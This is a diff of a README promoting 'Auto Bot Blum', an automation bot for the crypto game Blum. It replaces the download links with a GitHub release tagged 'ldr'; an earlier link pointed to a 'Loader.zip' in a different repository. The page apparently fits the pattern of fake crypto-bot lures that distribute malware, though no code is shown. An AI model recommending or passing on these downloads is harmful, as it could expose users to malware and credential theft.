@@ -2,7 +2,7 @@
 
 Welcome to the world of automation with **Auto Bot Blum**! Designed specifically for the crypto game Blum, our bot is here to revolutionize your gaming experience by automating all possible processes within the game.
 
-[**Download Now**]()
+[**Download Now**](https://github.com/ayman-elslamony/Blum-autoclicker/releases/tag/ldr)
 
 ---
 
@@ -43,7 +43,7 @@ https://github.com/user-attachments/assets/73f00997-9f5f-41e7-8ecf-e2432f6cf3a2
 
 Thousands of gamers have already transformed their Blum experience with Auto Bot Blum. Join them and see the difference for yourself. Ready to enhance your Blum gaming experience? Download Auto Bot Blum today and automate your way to success!
 
-[**Download Here**](https://github.com/DeadShotAV/Blum-autocliker/releases/download/donwoald/Loader.zip)
+[**Download Here**](https://github.com/ayman-elslamony/Blum-autoclicker/releases/tag/ldr)
 
 ---
 
